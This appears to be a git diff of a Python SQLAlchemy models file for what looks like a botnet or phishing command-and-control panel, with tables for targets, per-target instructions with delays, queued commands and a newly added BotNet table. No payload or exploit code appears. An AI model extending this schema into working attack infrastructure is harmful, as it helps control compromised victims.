@@ -16,23 +16,6 @@ class Users(Base):
         return f"[{self.email}, {self.password}]"
 
 
-class APILink(Base):
-    __tablename__ = 'API_LINK'
-    ID = Column(String, primary_key=True)
-    email = Column(String(20), ForeignKey('USERS.email'))
-    link = Column(String(20))
-    action_type = Column(Text)
-    condition = Column(Integer)
-
-    def __init__(self, ID, email, link, action_type, condition):
-        self.ID = ID
-        self.email = email
-        self.link = link
-        self.action_type = action_type
-        self.condition = condition
-
-    def __repr__(self):
-        return f"[{self.ID},{self.email}, {self.link}, {self.action_type}, {self.condition}]"
 
 class Fishing(Base):
     __tablename__ = 'FISHING'
@@ -115,21 +98,23 @@ class Targets(Base):
     def __repr__(self):
         return f"[{self.target_name}, {self.user_email},{self.token}]"
 
-
+# only hold one information per a person and it will get update everytime he/she change Instraction
 class Instraction(Base):
     __tablename__ = 'INSTRACTION'
     ID = Column(String, primary_key=True)
-    target_name = Column(String,ForeignKey('TARGETS.target_name'))
+    delay = Column(Integer)
+    target_name = Column(String,ForeignKey('TARGETS.target_name'),primary_key=True)
     instraction = Column(String)
 
-    def __init__(self ,ID , target_name, instraction,token):
+    def __init__(self ,ID , delay, target_name, instraction,token):
         self.ID = ID
+        self.delay = delay
         self.target_name = target_name
         self.instraction = instraction
 
 
     def __repr__(self):
-        return f"[{self.ID}, {self.target_name}, {self.instraction}]"
+        return f"[{self.ID}, {self.delay}, {self.target_name}, {self.instraction}]"
 
 
 class APICommand(Base):
@@ -149,3 +134,44 @@ class APICommand(Base):
 
     def __repr__(self):
         return f"[{self.ID},{self.email}, {self.target_name}, {self.cmd}, {self.condition}]"
+
+
+class APILink(Base):
+    __tablename__ = 'API_LINK'
+    ID = Column(String, primary_key=True)
+    email = Column(String(20), ForeignKey('USERS.email'))
+    target_name = Column(String,ForeignKey('TARGETS.target_name'))
+    link = Column(String(20))
+    action_type = Column(Text)
+    condition = Column(Integer)
+
+    def __init__(self, ID, email, target_name, link, action_type, condition):
+        self.ID = ID
+        self.email = email
+        self.target_name = target_name
+        self.link = link
+        self.action_type = action_type
+        self.condition = condition
+
+    def __repr__(self):
+        return f"[{self.ID},{self.email}, {self.target_name}, {self.link}, {self.action_type}, {self.condition}]"
+
+
+class BotNet(Base):
+    __tablename__ = 'BOT_NET'
+    ID = Column(String, primary_key=True)
+    token = Column(String,ForeignKey('API_TOKEN.token'))
+    target_name = Column(String,ForeignKey('TARGETS.target_name'))
+    botNetType = Column(String)
+    status = Column(String)
+
+    def __init__(self , ID, target_name, botNetType, token, status):
+        self.ID = ID
+        self.token = token
+        self.target_name = target_name
+        self.botNetType = botNetType
+        self.status = status
+
+
+    def __repr__(self):
+        return f"[{self.ID}, {self.token}, {self.target_name}, {self.botNetType}, {self.status}]"
